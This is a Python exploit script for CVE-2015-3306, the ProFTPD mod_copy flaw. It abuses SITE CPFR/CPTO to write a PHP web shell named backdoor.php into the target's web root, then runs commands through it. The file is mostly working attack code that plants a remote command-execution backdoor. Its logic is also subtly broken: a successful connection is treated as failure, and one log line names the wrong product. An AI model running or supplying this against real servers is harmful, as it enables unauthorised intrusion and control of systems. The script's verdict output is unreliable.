#!/usr/bin/env python3

import re
import socket
import requests
import argparse

import logging

log = logging.getLogger(__name__)


class ProFTPD:
    def __init__(self):
        self.__sock = None
        self.__host = None
        self.__port = 21
        self.__path = "/var/www/html"

    def __connect(self):
        log.debug(f"[!] Connecting to ProFTPD ({self.__host})")
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set a timeout
        self.__sock.settimeout(20)
        try:
            self.__sock.connect((self.__host, self.__port))
            log.debug(
                f"[!] Connection to ProFTPD established, removing timeout ({self.__host})"
            )
            self.__sock.settimeout(None)
            log.debug(f"[!] Receiving Banner ({self.__host})")
            banner = str(self.__sock.recv(1024), "utf-8")
            log.debug(f"[!] Banner received: {banner} ({self.__host})")
        except socket.error as e:
            log.info(f"[!] Error: {e} ({self.__host})")
            return True

    def __exploit(self):
        log.debug(f"[!] In exploit for ProFTPD ({self.__host})")
        payload = "<?php echo passthru($_GET['cmd']); ?>"
        try:
            self.__sock.send(b"site cpfr /proc/self/cmdline\n")
            self.__sock.recv(1024)
            self.__sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
            self.__sock.recv(1024)
            self.__sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
            self.__sock.recv(1024)
            self.__sock.send(
                ("site cpto " + self.__path + "/backdoor.php\n").encode("utf-8")
            )
        except Exception as e:
            log.info(f"[!] Error: {e} ({self.__host})")
            return True

        if "Copy successful" in str(self.__sock.recv(1024)):
            log.debug(
                f"[+] Target exploited, acessing shell at http://{self.__host}/backdoor.php ({self.__host})"
            )
            response = self.__trigger()
            log.debug(f"[+] Running whoami: {response}  ({self.__host})")
            log.info(f"[+] PHPMyAdmin is vulnerable ({self.__host})")
            return True
        else:
            log.info(f"[+] ProFTPD is secure ({self.__host})")
            return False

    def __trigger(self):
        log.debug(f"[!] Triggering ({self.__host})")
        data = requests.get("http://" + self.__host + "/backdoor.php?cmd=whoami")
        match = re.search('cpto /tmp/.([^"]+)', data.text)
        return match.group(0)[11::].replace("\n", "")

    def run(self, host, port=None):
        self.__host = host
        log.info(f"[+] Exploiting ProFTPD ({self.__host})")
        if port:
            self.__port = port
        if not self.__connect():
            log.info(
                f"[!] Connection issue to ProFTPD. Returning Vulnerable ({self.__host})"
            )
            return True
        result = self.__exploit()
        if result:
            log.info(f"[!] ProFTPD is vulnerable ({self.__host})")
            return True
        log.info(f"[!] ProFTPD is secure ({self.__host})")
        return False


def main(args):
    log.info("[+] CVE-2015-3306 exploit")
    log.info("[+] Exploiting " + args.host + ":" + args.port)

    exploit = ProFTPD()
    exploit.run(args.host, int(args.port))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
